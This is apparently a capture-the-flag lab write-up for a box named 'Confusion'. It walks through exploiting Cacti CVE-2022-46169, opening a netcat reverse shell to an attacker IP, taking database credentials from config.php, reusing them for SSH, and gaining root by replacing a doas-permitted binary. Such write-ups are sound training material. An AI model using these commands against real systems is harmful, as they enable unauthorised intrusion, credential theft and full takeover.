# Confusion - Writeup

## Initial Enumeration

### Port Scanning
A comprehensive port scan revealed open ports and potential virtual hosts:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4
80/tcp open  http    Apache httpd 2.4.54
443/tcp open  https   Apache httpd 2.4.54
```

### Web Enumeration
Through Nmap and virtual host discovery, I identified two domains:
- confusion.pg → Displayed an "Under Construction" page
- cacti-monitoring.confusion.pg → Required HTTPS to access the login page

Adding these domains to my `/etc/hosts` file:
```bash
echo "192.168.172.99 confusion.pg cacti-monitoring.confusion.pg" >> /etc/hosts
```

Accessing the Cacti monitoring site revealed:
- Cacti Version 1.2.20
- Research indicated this version is vulnerable to CVE-2022-46169, an unauthenticated command injection vulnerability

## Gaining Initial Access

### Exploiting CVE-2022-46169
I attempted to exploit the vulnerability using different POCs:

1. First attempt failed with "FATAL: Unauth error"
2. Second attempt with a modified exploit confirmed the vulnerability:
```bash
curl -I https://cacti-monitoring.confusion.pg/ -H "X-Forwarded-For: 127.0.0.1" | grep Server
```

This successfully returned my server headers, confirming command execution was possible.

I then obtained a reverse shell as `www-data`:
```bash
python3 '/home/kali/Downloads/CVE-2022-46169.py' https://cacti-monitoring.confusion.pg/ -c 'busybox nc 192.168.45.225 3000 -e /bin/bash'
```

In a separate terminal, I had set up a listener:
```bash
nc -lvnp 3000
```

## Lateral Movement

### Database Credential Discovery
Once I had shell access as `www-data`, I explored the Cacti installation and found database credentials in the configuration file:
```bash
cat /var/www/html/cacti/include/config.php
```

This revealed the following database password:
```
uTyWUHAdetb3O23aUEOo1KRg
```

I attempted to enumerate the database:
```bash
mysql -u cacti -p'uTyWUHAdetb3O23aUEOo1KRg' -D cacti
```

While I found a bcrypt hash for the admin user, I was unable to crack it.

### Password Reuse
I discovered a local user named `james` on the system and tried the database password for SSH access:
```bash
ssh james@192.168.172.99
Password: uTyWUHAdetb3O23aUEOo1KRg
```

This succeeded, confirming password reuse and providing a more stable user-level access to the system.

## Privilege Escalation

### DOAS Configuration Analysis
Checking for privilege escalation vectors, I examined the DOAS configuration:
```bash
cat /etc/doas.conf
```

The configuration revealed that user `james` could run `/usr/local/sbin/systeminfo` as root:
```
permit james as root cmd /usr/local/sbin/systeminfo
```

### Binary Replacement Attack
I checked the permissions on the directory:
```bash
ls -la /usr/local/sbin/
```

Finding that `/usr/local/sbin` was writable by `james`, I executed a binary replacement attack:

1. Removed the original root-owned systeminfo file:
```bash
rm -rf /usr/local/sbin/systeminfo
```

2. Created a new systeminfo file containing a shell payload:
```bash
echo '/bin/bash' > /usr/local/sbin/systeminfo
```

3. Made the new file executable:
```bash
chmod +x /usr/local/sbin/systeminfo
```

4. Executed the file with DOAS to gain root access:
```bash
/usr/local/bin/doas -u root /usr/local/sbin/systeminfo
```

This immediately provided a root shell, successfully completing the privilege escalation and giving full control over the target system.